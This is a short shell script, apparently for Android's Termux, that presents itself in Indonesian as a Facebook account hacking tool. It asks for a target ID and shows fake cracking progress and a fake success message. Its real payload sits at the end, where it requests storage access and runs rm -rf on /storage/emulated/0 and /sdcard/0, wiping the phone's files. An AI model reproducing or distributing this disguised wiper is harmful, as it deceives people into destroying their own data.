...
echo $G1"1.Login?"
echo $Y1"2.Hack Fb target 85% work"
...
sleep 1
echo $R1"Masukan Id Target Dibawah"
read p;
sleep 2
echo $Y1"Sedang crack"
sleep 2
echo $G1"10%"
sleep 2
echo $G1"20%"
...
echo $G1"100%"
sleep 5
echo $B1"Password Berhasil Crack"
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/
